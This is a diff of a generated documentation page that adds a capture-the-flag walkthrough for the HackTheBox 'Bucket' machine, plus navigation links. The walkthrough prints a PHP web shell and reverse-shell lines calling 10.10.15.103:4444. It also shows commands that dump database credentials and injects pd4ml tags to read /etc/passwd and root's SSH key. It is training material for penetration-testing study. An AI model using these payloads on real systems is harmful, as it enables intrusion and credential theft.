@@ -2278,6 +2278,15 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#roy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Roy
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -2341,6 +2350,27 @@
   
   <span class="md-ellipsis">
     Compiled
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Developer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Developer
   </span>
   
 
@@ -2819,6 +2849,48 @@
   
   
     <li class="md-nav__item">
+      <a href="../Strutted/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Strutted
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../TwoMillion/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    TwoMillion
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../Usage/" class="md-nav__link">
         
   
@@ -3231,6 +3303,27 @@
   
   
     <li class="md-nav__item">
+      <a href="../../../OSWE/Challenge%20Labs/DocEdit/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DocEdit
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../../OSWE/Challenge%20Labs/Erka/" class="md-nav__link">
         
   
@@ -3299,6 +3392,27 @@
   
   <span class="md-ellipsis">
     POC script requirement
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OSWE/Challenge%20Labs/sqeakr/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    sqeakr
   </span>
   
 
@@ -3746,6 +3860,27 @@
   
   <span class="md-ellipsis">
     Research: Exploiting Jsonpickle to Get RCE
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OSWE/Post-course/Trouble1/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Trouble1
   </span>
   
 
@@ -4855,6 +4990,15 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#roy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Roy
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -4871,6 +5015,8 @@
 
 
 <h1 id="bucket">Bucket</h1>
+<p><a href="https://docs.aws.amazon.com/cli/latest/">AWS CLI Command Reference</a></p>
+<p><a href="https://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/DynamoDB.html#listTables-property">AWS DynamoDB Command Documentation</a></p>
 <pre><code class="language-bash">└─$ sudo nmap 10.10.10.212 -p- --min-rate=10000 -T4 -sCV  
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
@@ -4952,6 +5098,229 @@ support@bucket.htb</p>
 * Connection #0 to host s3.bucket.htb left intact
 
 {&quot;status&quot;: &quot;running&quot;}  
+
+# Test PUT (upload)
+curl -X PUT --data-binary &quot;test&quot; http://s3.bucket.htb/adserver/test.txt
+
+echo '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' &gt; shell.php
+
+# successfullly upload to the bucket, but cannot be executed
+curl -X PUT -H &quot;Content-Type: application/x-httpd-php&quot; --data-binary &quot;&lt;?php exec(\&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.103/4444 0&gt;&amp;1'\&quot;); ?&gt;&quot; http://s3.bucket.htb/adserver/shell.php
+
+curl -X PUT --data-binary &quot;AddType application/x-httpd-php .php&quot; http://s3.bucket.htb/adserver/.htaccess
+</code></pre>
+<pre><code class="language-bash">sudo apt install awscli
+
+# list bucket
+aws --endpoint-url=http://s3.bucket.htb s3 ls
+
+Unable to locate credentials. You can configure credentials by running &quot;aws configure&quot;.
+
+# configure the keys by using a random credential
+aws configure 
+
+AWS Access Key ID [None]: test
+AWS Secret Access Key [None]: test
+Default region name [None]: us-east-1
+Default output format [None]: 
+
+aws --endpoint-url=http://s3.bucket.htb s3 ls
+2025-04-24 07:46:03 adserver
+
+# list content in s3 bucket
+aws --endpoint-url=http://s3.bucket.htb s3 ls s3://adserver
+                           PRE images/
+2025-04-24 07:46:04       5344 index.html
+
+aws --endpoint-url=http://s3.bucket.htb s3 cp shell.php s3://adserver
+upload: ./shell.php to s3://adserver/shell.php
+</code></pre>
+<p>http://bucket.htb/shell.php?cmd=id</p>
+<p><img alt="alt text" src="../assets/Bucket/image.png" /></p>
+<p>If you use s3 bucket link to access the shell.php file, it will download the file instead of execute it.</p>
+<p>http://s3.bucket.htb/shell.php?cmd=id</p>
+<p>The uploaded files will be deleted in minutes.</p>
+<pre><code class="language-bash">echo &quot;&lt;?php exec('/bin/bash -c \&quot;bash -i &gt;&amp; /dev/tcp/10.10.15.103/4444 0&gt;&amp;1 \&quot;'); ?&gt;&quot; &gt; shell.php
+
+aws --endpoint-url=http://s3.bucket.htb s3 cp shell.php s3://adserver
+upload: ./shell.php to s3://adserver/shell.php
+</code></pre>
+<p><img alt="alt text" src="../assets/Bucket/image-1.png" /></p>
+<pre><code class="language-bash"># to obtain though a stable and interactive shell.
+python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);'
+CRTL + Z
+stty raw -echo
+</code></pre>
+<pre><code class="language-bash">/home/roy/project$ cat db.php
+cat db.php
+&lt;?php
+require 'vendor/autoload.php';
+date_default_timezone_set('America/New_York');
+use Aws\DynamoDb\DynamoDbClient;
+use Aws\DynamoDb\Exception\DynamoDbException;
+
+$client = new Aws\Sdk([
+    'profile' =&gt; 'default',
+    'region'  =&gt; 'us-east-1',
+    'version' =&gt; 'latest',
+    'endpoint' =&gt; 'http://localhost:4566'
+]);
+
+$dynamodb = $client-&gt;createDynamoDb();
+
+//todo
+
+$ aws configure
+aws configure
+AWS Access Key ID [None]: test
+AWS Secret Access Key [None]: test
+Default region name [None]: us-east-1
+Default output format [None]: 
+
+[Errno 13] Permission denied: '/var/www/.aws'
+
+$ mkdir /tmp/f
+$ export HOME=/tmp/f
+
+$ aws configure
+aws configure
+AWS Access Key ID [None]: test
+AWS Secret Access Key [None]: test
+Default region name [None]: us-east-1
+Default output format [None]: 
+
+# List all tables from bynamodb
+$ aws --endpoint-url=http://localhost:4566 dynamodb list-tables
+
+{
+    &quot;TableNames&quot;: [
+        &quot;users&quot;
+    ]
+}
+
+$ aws --endpoint-url=http://localhost:4566 dynamodb scan --table-name users
+
+{
+    &quot;Items&quot;: [
+        {
+            &quot;password&quot;: {
+                &quot;S&quot;: &quot;Management@#1@#&quot;
+            },
+            &quot;username&quot;: {
+                &quot;S&quot;: &quot;Mgmt&quot;
+            }
+        },
+        {
+            &quot;password&quot;: {
+                &quot;S&quot;: &quot;Welcome123!&quot;
+            },
+            &quot;username&quot;: {
+                &quot;S&quot;: &quot;Cloudadm&quot;
+            }
+        },
+        {
+            &quot;password&quot;: {
+                &quot;S&quot;: &quot;n2vM-&lt;_K_Q:.Aa2&quot;
+            },
+            &quot;username&quot;: {
+                &quot;S&quot;: &quot;Sysadm&quot;
+            }
+        }
+    ],
+    &quot;Count&quot;: 3,
+    &quot;ScannedCount&quot;: 3,
+    &quot;ConsumedCapacity&quot;: null
+}
+</code></pre>
+<h2 id="roy">Roy</h2>
+<p><code>roy:n2vM-&lt;_K_Q:.Aa2</code></p>
+<pre><code class="language-bash">$ netstat -tunl
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:34821         0.0.0.0:*               LISTEN     
+tcp6       0      0 :::80                   :::*                    LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN     
+udp        0      0 127.0.0.53:53           0.0.0.0:* 
+</code></pre>
+<pre><code class="language-bash">roy@bucket:/var/www/bucket-app$ cat index.php
+&lt;?php
+require 'vendor/autoload.php';
+use Aws\DynamoDb\DynamoDbClient;
+if($_SERVER[&quot;REQUEST_METHOD&quot;]===&quot;POST&quot;) {
+        if($_POST[&quot;action&quot;]===&quot;get_alerts&quot;) {
+                date_default_timezone_set('America/New_York');
+                $client = new DynamoDbClient([
+                        'profile' =&gt; 'default',
+                        'region'  =&gt; 'us-east-1',
+                        'version' =&gt; 'latest',
+                        'endpoint' =&gt; 'http://localhost:4566'
+                ]);
+
+                $iterator = $client-&gt;getIterator('Scan', array(
+                        'TableName' =&gt; 'alerts',
+                        'FilterExpression' =&gt; &quot;title = :title&quot;,
+                        'ExpressionAttributeValues' =&gt; array(&quot;:title&quot;=&gt;array(&quot;S&quot;=&gt;&quot;Ransomware&quot;)),
+                ));
+                foreach ($iterator as $item) {
+                        $name=rand(1,10000).'.html';
+                        file_put_contents('files/'.$name,$item[&quot;data&quot;]);
+                }
+                passthru(&quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf&quot;);
+        }
+}
+else
+{
+?&gt;
+</code></pre>
+<p>The above code connects to <code>DynamoDB</code> service and performs a scan of the <code>alerts</code> table. It then filters the content based on title. If there's a key that contains <code>Ransomware</code> title then it writes its data value to a random <code>html</code> file inside files folder. Using the <code>PD4ML</code> utility it converts the HTML contents to a PDF file. By checking the list of tables, we observe that there's no <code>alerts</code> table present in the <code>DynamoDB</code> database.</p>
+<pre><code class="language-bash">$ ssh -L 8000:127.0.0.1:8000 roy@bucket.htb
+</code></pre>
+<p><img alt="alt text" src="../assets/Bucket/image-2.png" /></p>
+<p><img alt="alt text" src="../assets/Bucket/image-3.png" /></p>
+<p><code>pd4ml_demo.jar</code> is used to create PDFs by the site on port 8000.</p>
+<pre><code class="language-bash"># create alerts table, the table will be automatically deleted in minutes
+
+aws --endpoint-url=http://localhost:4566 dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
+</code></pre>
+<p><img alt="alt text" src="image-4.png" /></p>
+<pre><code class="language-bash">aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts --item '{&quot;title&quot;:{&quot;S&quot;:&quot;Ransomware&quot;},&quot;data&quot;:{&quot;S&quot;:&quot;&lt;html&gt;&lt;h1&gt;test&lt;/h1&gt;&lt;/html&gt;&quot;}}'
+
+{
+    &quot;ConsumedCapacity&quot;: {
+        &quot;TableName&quot;: &quot;alerts&quot;,
+        &quot;CapacityUnits&quot;: 1.0
+    }
+}
+
+# on Kali
+curl http://localhost:8000/index.php -d 'action=get_alerts'
+</code></pre>
+<p><img alt="alt text" src="../assets/Bucket/image-5.png" /></p>
+<p><img alt="alt text" src="../assets/Bucket/image-6.png" /></p>
+<p>We see that the PDF is indeed created with HTML that we provided in the database. Checking the supported HTML tags for pd4ml reveals that we can also embed an external resource as PDF
+attachment using the <code>attachment</code> tag.</p>
+<p>This feature seems like no longer exists in the latest version.</p>
+<pre><code class="language-html">&lt;pd4ml:attachment src=&quot;http://pd4ml.com/i/logo.png&quot; description=&quot;test&quot;
+icon=&quot;Paperclip&quot;/&gt;
+
+&lt;html&gt;&lt;pd4ml:attachment src=&quot;file:///etc/passwd&quot; description=&quot;test&quot;
+icon=&quot;Paperclip&quot;/&gt;&lt;/html&gt;
+</code></pre>
+<pre><code class="language-bash">aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts --item '{&quot;title&quot;:{&quot;S&quot;:&quot;Ransomware&quot;},&quot;data&quot;:{&quot;S&quot;:&quot;&lt;html&gt;&lt;pd4ml:attachment src=\&quot;file:///etc/passwd\&quot; description=\&quot;test\&quot; icon=\&quot;Paperclip\&quot;/&gt;&lt;/html&gt;&quot;}}'
+
+aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts --item '{&quot;title&quot;:{&quot;S&quot;:&quot;Ransomware&quot;},&quot;data&quot;:{&quot;S&quot;:&quot;&lt;html&gt;&lt;pd4ml:attachment src='\''file:///etc/passwd'\'' description='\''test'\'' icon='\''Paperclip'\''/&gt;&lt;/html&gt;&quot;}}'
+</code></pre>
+<p><img alt="alt text" src="../assets/Bucket/image-7.png" /></p>
+<pre><code class="language-bash">aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts --item '{&quot;title&quot;:{&quot;S&quot;:&quot;Ransomware&quot;},&quot;data&quot;:{&quot;S&quot;:&quot;&lt;html&gt;&lt;pd4ml:attachment src='\''file:///root/'\'' description='\''test'\'' icon='\''Paperclip'\''/&gt;&lt;/html&gt;&quot;}}'
+
+aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts --item '{&quot;title&quot;:{&quot;S&quot;:&quot;Ransomware&quot;},&quot;data&quot;:{&quot;S&quot;:&quot;&lt;html&gt;&lt;pd4ml:attachment src='\''file:///root/.ssh/id_rsa'\'' description='\''test'\'' icon='\''Paperclip'\''/&gt;&lt;/html&gt;&quot;}}'
+</code></pre>
+<pre><code class="language-bash">chmod 600 id_rsa
+ssh -i id_rsa root@bucket.htb
 </code></pre>
 
 
@@ -4973,7 +5342,7 @@ support@bucket.htb</p>
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1-2.1-2M12.5 7v5.2l4 2.4-1 1L11 13V7h1.5M11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2v1.8Z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">February 25, 2024</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">April 28, 2025</span>
   </span>
 
     
